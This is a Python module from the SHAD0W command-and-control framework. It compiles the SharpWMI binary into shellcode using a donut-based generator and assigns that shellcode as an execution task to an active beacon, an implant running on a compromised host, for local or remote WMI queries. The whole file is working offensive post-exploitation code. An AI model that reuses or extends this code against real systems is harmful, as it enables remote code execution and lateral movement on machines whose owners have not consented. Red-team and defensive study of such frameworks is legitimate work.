#
# Execute sharpwmi on a session
#

import argparse

from lib import shellcode

__description__ = "An implementation of various WMI functionality. Including local/remote WMI queries"
__author__ = "@_batsec_, @harmj0y"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of sharpwmi binary
SHARPWMI_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SharpWMI.exe"

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def sharpwmi_callback(shad0w, data):
    print(data)

    return ""

def usage():
    pass

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    sharpwmi_args = ' '.join(args[1:])

    # kinda a hack to make sure we intergrate nice with the shellcode generator
    args = DummyClass()

    if len(sharpwmi_args) != 0:
        args.param = sharpwmi_args
    else:
        args.param = False
        sharpwmi_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    b64_comp_data = shellcode.generate(SHARPWMI_BIN, args, sharpwmi_args)

    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[shad0w.current_beacon]["callback"] = sharpwmi_callback
